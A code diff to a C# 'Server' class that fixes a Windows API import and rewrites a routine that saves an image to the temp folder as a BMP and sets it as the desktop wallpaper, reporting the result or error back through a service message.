@@ -1,4 +1,5 @@
-﻿using Microsoft.Win32;
+﻿
+using Microsoft.Win32;
 using System;
 using System.Drawing;
 using System.Collections.Generic;
@@ -14,11 +15,11 @@ namespace Server
 {
     public static class Manipulate
     {
-        [DllImport("user.dll")]
-        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+        const int SPI_SETDESKWALLPAPER = 0x14;
+        const int SPIF_UPDATEINIFILE = 0x01;
 
-        static int SPI_SETDESKWALLPAPER = 0x0014;
-        static int SPIF_UPDATEINIFILE = 0x01;
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);
 
         public static int DoAction(string action)
         {
@@ -29,13 +30,21 @@ namespace Server
             return 1;
         }
 
-        public static void ChangeBackground(Image image)
+        public static void ChangeBackground(Image img)
         {
-            string tempPath = Path.Combine(Path.GetTempPath(), "new_background.jpeg");
+            try
+            {
+                string bmpImgPath;
 
-            image.Save(tempPath, ImageFormat.Jpeg);
+                bmpImgPath = Path.Combine(Path.GetTempPath(), "image.bmp");
+                img.Save(bmpImgPath, ImageFormat.Bmp);
 
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE);
+                ServerMain.service.SendMessage(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, bmpImgPath, SPIF_UPDATEINIFILE).ToString());
+            }
+            catch (Exception e)
+            {
+                ServerMain.service.SendMessage(e.Message);
+            }
         }
     }
 }
